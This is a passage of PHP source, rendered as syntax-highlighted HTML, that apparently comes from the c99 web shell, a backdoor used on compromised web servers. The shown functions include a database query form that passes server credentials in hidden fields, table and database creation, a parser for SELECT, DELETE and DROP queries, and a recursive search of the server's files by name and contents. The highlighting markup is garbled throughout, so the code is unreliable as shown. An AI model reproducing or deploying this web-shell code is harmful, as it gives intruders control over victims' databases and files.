<span class="s2"> </span><span class="si">$out</span><span class="s2"> .= &quot;</span><span class="c1">#---------------------------------------------------------------------------------</span>

<span class="s2">&quot;;</span>
<span class="s2"> if (</span><span class="si">$file</span><span class="s2">)</span>
<span class="s2"> {</span>
<span class="s2">  </span><span class="si">$fp</span><span class="s2"> = fopen(</span><span class="si">$file</span><span class="s2">, &quot;</span><span class="nx">w</span><span class="s2">&quot;);</span>
<span class="s2">  if (!</span><span class="si">$fp</span><span class="s2">) </span><span class="si">{</span><span class="nv">$ret</span><span class="p">[</span><span class="s2">&quot;err&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  else</span>
<span class="s2">  {</span>
<span class="s2">   fwrite (</span><span class="si">$fp</span><span class="s2">, </span><span class="si">$out</span><span class="s2">);</span>
<span class="s2">   fclose (</span><span class="si">$fp</span><span class="s2">);</span>
<span class="s2">  }</span>
<span class="s2"> }</span>
<span class="s2"> if (</span><span class="si">$print</span><span class="s2">) {if (</span><span class="si">$nl2br</span><span class="s2">) {echo nl2br(</span><span class="si">$out</span><span class="s2">);} else {echo </span><span class="si">$out</span><span class="s2">;}}</span>
<span class="s2"> return </span><span class="si">$out</span><span class="s2">;</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">mysql_buildwhere</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function mysql_buildwhere(</span><span class="si">$array</span><span class="s2">,</span><span class="si">$sep</span><span class="s2">=&quot;</span> <span class="k">and</span><span class="s2">&quot;,</span><span class="si">$functs</span><span class="s2">=array())</span>
<span class="s2">{</span>
<span class="s2"> if (!is_array(</span><span class="si">$array</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> </span><span class="si">$result</span><span class="s2"> = &quot;&quot;;</span>
<span class="s2"> foreach(</span><span class="si">$array</span><span class="s2"> as </span><span class="si">$k</span><span class="s2">=&amp;gt;</span><span class="si">$v</span><span class="s2">)</span>
<span class="s2"> {</span>
<span class="s2">  </span><span class="si">$value</span><span class="s2"> = &quot;&quot;;</span>
<span class="s2">  if (!empty(</span><span class="si">$functs[$k]</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$value</span> <span class="o">.=</span> <span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;(&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  </span><span class="si">$value</span><span class="s2"> .= &quot;</span><span class="s1">&#39;&quot;.addslashes($v).&quot;&#39;</span><span class="s2">&quot;;</span>
<span class="s2">  if (!empty(</span><span class="si">$functs[$k]</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$value</span> <span class="o">.=</span> <span class="s2">&quot;)&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  </span><span class="si">$result</span><span class="s2"> .= &quot;</span><span class="sb">`&quot;.$k.&quot;`</span> <span class="o">=</span> <span class="s2">&quot;.</span><span class="si">$value</span><span class="s2">.</span><span class="si">$sep</span><span class="s2">;</span>
<span class="s2"> }</span>
<span class="s2"> </span><span class="si">$result</span><span class="s2"> = substr(</span><span class="si">$result</span><span class="s2">,0,strlen(</span><span class="si">$result</span><span class="s2">)-strlen(</span><span class="si">$sep</span><span class="s2">));</span>
<span class="s2"> return </span><span class="si">$result</span><span class="s2">;</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">mysql_fetch_all</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function mysql_fetch_all(</span><span class="si">$query</span><span class="s2">,</span><span class="si">$sock</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> if (</span><span class="si">$sock</span><span class="s2">) </span><span class="si">{</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="nv">$sock</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> else </span><span class="si">{</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> </span><span class="si">$array</span><span class="s2"> = array();</span>
<span class="s2"> while (</span><span class="si">$row</span><span class="s2"> = mysql_fetch_array(</span><span class="si">$result</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> mysql_free_result(</span><span class="si">$result</span><span class="s2">);</span>
<span class="s2"> return </span><span class="si">$array</span><span class="s2">;</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">mysql_smarterror</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function mysql_smarterror(</span><span class="si">$type</span><span class="s2">,</span><span class="si">$sock</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> if (</span><span class="si">$sock</span><span class="s2">) </span><span class="si">{</span><span class="nv">$error</span> <span class="o">=</span> <span class="nb">mysql_error</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> else </span><span class="si">{</span><span class="nv">$error</span> <span class="o">=</span> <span class="nb">mysql_error</span><span class="p">();</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> </span><span class="si">$error</span><span class="s2"> = htmlspecialchars(</span><span class="si">$error</span><span class="s2">);</span>
<span class="s2"> return </span><span class="si">$error</span><span class="s2">;</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">mysql_query_form</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function mysql_query_form()</span>
<span class="s2">{</span>
<span class="s2"> global </span><span class="si">$submit</span><span class="s2">,</span><span class="si">$sql_act</span><span class="s2">,</span><span class="si">$sql_query</span><span class="s2">,</span><span class="si">$sql_query_result</span><span class="s2">,</span><span class="si">$sql_confirm</span><span class="s2">,</span><span class="si">$sql_query_error</span><span class="s2">,</span><span class="si">$tbl_struct</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$sql_query</span><span class="s2"> = urldecode(</span><span class="si">$sql_query</span><span class="s2">);</span>
<span class="s2"> if ((</span><span class="si">$submit</span><span class="s2">) and (!</span><span class="si">$sql_query_result</span><span class="s2">) and (</span><span class="si">$sql_confirm</span><span class="s2">)) {if (!</span><span class="si">$sql_query_error</span><span class="s2">) </span><span class="si">{</span><span class="nv">$sql_query_error</span> <span class="o">=</span> <span class="s2">&quot;Query was empty&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"> echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Error</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.</span><span class="si">$sql_query_error</span><span class="s2">.&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;}</span>
<span class="s2"> if (</span><span class="si">$sql_query_result</span><span class="s2"> or (!</span><span class="si">$sql_confirm</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$sql_act</span> <span class="o">=</span> <span class="nv">$sql_goto</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> if ((!</span><span class="si">$submit</span><span class="s2">) or (</span><span class="si">$sql_act</span><span class="s2">))</span>
<span class="s2"> {</span>
<span class="s2">  echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">table</span> <span class="nx">border</span><span class="o">=</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="nx">POST</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;; if ((</span><span class="si">$sql_query</span><span class="s2">) and (!</span><span class="si">$submit</span><span class="s2">)) {echo &quot;</span><span class="k">Do</span> <span class="nx">you</span> <span class="nx">really</span> <span class="nx">want</span> <span class="nx">to</span><span class="s2">&quot;;} else {echo &quot;</span><span class="nx">SQL</span><span class="o">-</span><span class="nx">Query</span><span class="s2">&quot;;} echo &quot;</span><span class="o">:&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">b</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">textarea</span> <span class="nx">name</span><span class="o">=</span><span class="nx">sql_query</span> <span class="nx">cols</span><span class="o">=</span><span class="mi">100</span> <span class="nx">rows</span><span class="o">=</span><span class="mi">10</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.htmlspecialchars(</span><span class="si">$sql_query</span><span class="s2">).&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">textarea</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_port</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_server</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_passwd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">sql_login</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">act</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">sql</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=sql_tbl value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=submit value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">sql_goto</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_goto</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=submit name=sql_confirm value=</span><span class="se">\&quot;</span><span class="s2">Yes</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">No</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$tbl_struct</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td valign=</span><span class="se">\&quot;</span><span class="s2">top</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;Fields:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$tbl_struct</span> <span class="k">as</span> <span class="nv">$field</span><span class="p">)</span> <span class="p">{</span><span class="nv">$name</span> <span class="o">=</span> <span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Field&quot;</span><span class="p">];</span> <span class="k">echo</span> <span class="s2">&quot; &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.c99sh_sqlquery.sql_query.value+=&#39;`&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;`&#39;;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query_result</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="nv">$sql_last_query</span><span class="p">;}</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_create_db&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">mysql_create_db</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$sock</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;CREATE DATABASE `&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span><span class="nv">$sock</span><span class="p">);}</span>
 <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);}</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_query_parse&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">mysql_query_parse</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$query</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
 <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">explode</span> <span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$query</span><span class="p">);</span>
 <span class="cm">/*array array()</span>
<span class="cm"> {</span>
<span class="cm">  &quot;METHOD&quot;=&amp;gt;array(output_type),</span>
<span class="cm">  &quot;METHOD1&quot;...</span>
<span class="cm">  ...</span>
<span class="cm"> }</span>
<span class="cm"> if output_type == 0, no output,</span>
<span class="cm"> if output_type == 1, no output if no error</span>
<span class="cm"> if output_type == 2, output without control-buttons</span>
<span class="cm"> if output_type == 3, output with control-buttons</span>
<span class="cm"> */</span>
 <span class="nv">$types</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
  <span class="s2">&quot;SELECT&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span>
  <span class="s2">&quot;SHOW&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span>
  <span class="s2">&quot;DELETE&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
  <span class="s2">&quot;DROP&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 <span class="p">);</span>
 <span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
 <span class="nv">$op</span> <span class="o">=</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$types</span><span class="p">[</span><span class="nv">$op</span><span class="p">]))</span>
 <span class="p">{</span>
  <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;propertions&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$types</span><span class="p">[</span><span class="nv">$op</span><span class="p">];</span>
  <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;query&quot;</span><span class="p">]</span>  <span class="o">=</span> <span class="nv">$query</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$types</span><span class="p">[</span><span class="nv">$op</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">foreach</span><span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;LIMIT&quot;</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
     <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]);</span>
     <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">])</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]);}</span>
     <span class="nb">unset</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="p">],</span><span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="o">+</span><span class="mi">1</span><span class="p">]);</span>
    <span class="p">}</span>
   <span class="p">}</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;c99fsearch&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">c99fsearch</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">global</span> <span class="nv">$found</span><span class="p">;</span>
 <span class="k">global</span> <span class="nv">$found_d</span><span class="p">;</span>
 <span class="k">global</span> <span class="nv">$found_f</span><span class="p">;</span>
 <span class="k">global</span> <span class="nv">$search_i_f</span><span class="p">;</span>
 <span class="k">global</span> <span class="nv">$search_i_d</span><span class="p">;</span>
 <span class="k">global</span> <span class="nv">$a</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
 <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
 <span class="k">while</span> <span class="p">((</span><span class="nv">$f</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$f</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="nv">$bool</span> <span class="o">=</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name_regexp&quot;</span><span class="p">])</span> <span class="k">and</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">])</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name_regexp&quot;</span><span class="p">]</span> <span class="k">and</span> <span class="nb">ereg</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">],</span><span class="nv">$f</span><span class="p">));</span>
   <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span>
   <span class="p">{</span>
    <span class="nv">$search_i_d</span><span class="o">++</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">])</span> <span class="k">and</span> <span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_d</span><span class="o">++</span><span class="p">;}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span><span class="nx">c99fsearch</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);}</span>
   <span class="p">}</span>
   <span class="k">else</span>
   <span class="p">{</span>
    <span class="nv">$search_i_f</span><span class="o">++</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span>
    <span class="p">{</span>
     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]))</span>
     <span class="p">{</span>
      <span class="nv">$r</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_wwo&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_cs&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]);</span> <span class="nv">$r</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$r</span><span class="p">);}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_regexp&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="nb">ereg</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">],</span><span class="nv">$r</span><span class="p">);}</span>
      <span class="k">else</span> <span class="p">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="nb">strpos</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="o">.</span><span class="nv">$r</span><span class="p">,</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">],</span><span class="mi">1</span><span class="p">);}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="s2">&quot;text_not&quot;</span><span class="p">])</span> <span class="p">{</span><span class="nv">$bool</span> <span class="o">=</span> <span class="o">!</span><span class="nv">$bool</span><span class="p">;}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$bool</span><span class="p">)</span> <span class="p">{</span><span class="nv">$found</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">;</span> <span class="nv">$found_f</span><span class="o">++</span><span class="p">;}</span>
     <span class="p">}</span>
